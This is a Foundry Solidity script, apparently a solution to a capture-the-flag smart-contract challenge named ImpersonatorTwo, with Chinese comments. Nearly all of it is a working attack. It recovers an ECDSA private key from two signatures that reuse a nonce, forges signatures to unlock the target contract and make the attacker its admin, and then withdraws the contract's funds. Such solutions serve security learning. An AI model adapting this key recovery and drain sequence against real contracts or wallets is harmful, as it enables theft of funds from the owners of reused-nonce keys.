// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Strings} from "lib/openzeppelin-contracts/contracts/utils/Strings.sol";

interface IImpersonatorTwo {
    function admin() external view returns (address);
    function nonce() external view returns (uint256);
    function locked() external view returns (bool);
    function setAdmin(bytes memory signature, address newAdmin) external;
    function switchLock(bytes memory signature) external;
    function withdraw() external;
    function hash_message(string memory message) external pure returns (bytes32);
}


contract SolveImpersonator is Script {
    using Strings for uint256;

    // secp256k1 曲線的階 n (常數)
    uint256 constant N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;

    function run() external {
        // --- 0. 準備數據 (你找到的那些) ---
        uint256 h1 = 0x937fa99fb61f6cd81c00ddda80cc218c11c9a731d54ce8859cb2309c77b79bf3;
        uint256 h2 = 0x6a0d6cd0c2ca5d901d94d52e8d9484e4452a3668ae20d63088909611a7dccc51;
        uint256 r  = 0xe5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40;
        uint256 s1 = 0x70026fc30e4e02a15468de57155b080f405bd5b88af05412a9c3217e028537e3;
        uint256 s2 = 0x4c3ac03b268ae1d2aca1201e8a936adf578a8b95a49986d54de87cd0ccb68a79;

        // --- 1. 破解私鑰 ---
        // k = (h1 - h2) / (s1 - s2) mod n
        uint256 deltaH = addmod(h1, N - h2, N);
        uint256 deltaS = addmod(s1, N - s2, N);
        uint256 k = mulmod(deltaH, inverse(deltaS), N);

        // privateKey = (s1 * k - h1) / r mod n
        uint256 sk = mulmod(s1, k, N);
        uint256 privateKey = mulmod(addmod(sk, N - h1, N), inverse(r), N);

        console.log("Cracked Private Key:", vm.toString(bytes32(privateKey)));

        // --- 2. 開始執行攻擊交易 ---
        uint256 attackerKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerKey);
        address targetAddr = vm.envAddress("INSTANCE_ADDRESS");
        IImpersonatorTwo target = IImpersonatorTwo(targetAddr);

        vm.startBroadcast(attackerKey);

        // A. 如果合約是鎖定的，先解鎖
        if (true) {
            uint256 currentNonce = target.nonce();
            string memory msgStr = string(abi.encodePacked("lock", currentNonce.toString()));
            bytes32 hash = target.hash_message(msgStr);
            bytes memory sig = signWithKey(privateKey, hash);
            
            console.log("Unlocking...");
            target.switchLock(sig);
        }

        // B. 設置自己為 Admin
        {
            uint256 currentNonce = target.nonce();
            string memory msgStr = string(abi.encodePacked("admin", currentNonce.toString(), attacker));
            bytes32 hash = target.hash_message(msgStr);
            bytes memory sig = signWithKey(privateKey, hash);

            console.log("Setting Admin to:", attacker);
            target.setAdmin(sig, attacker);
        }

        // C. 提款
        console.log("Withdrawing funds...");
        target.withdraw();

        console.log("Success! Contract balance:", address(targetAddr).balance);
        vm.stopBroadcast();
    }

    // 輔助函數：計算模反元素 (費馬小定理)
    function inverse(uint256 a) internal pure returns (uint256) {
        return power(a, N - 2);
    }

    function power(uint256 base, uint256 exp) internal pure returns (uint256) {
        uint256 res = 1;
        base  %= N;
        while (exp > 0) {
            if (exp % 2 == 1) res = mulmod(res, base, N);
            base = mulmod(base, base, N);
            exp /= 2;
        }
        return res;
    }

    // 輔助函數：用私鑰生成簽名 (r, s, v)
    function signWithKey(uint256 privKey, bytes32 digest) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, digest);
        return abi.encodePacked(r, s, v);
    }
}
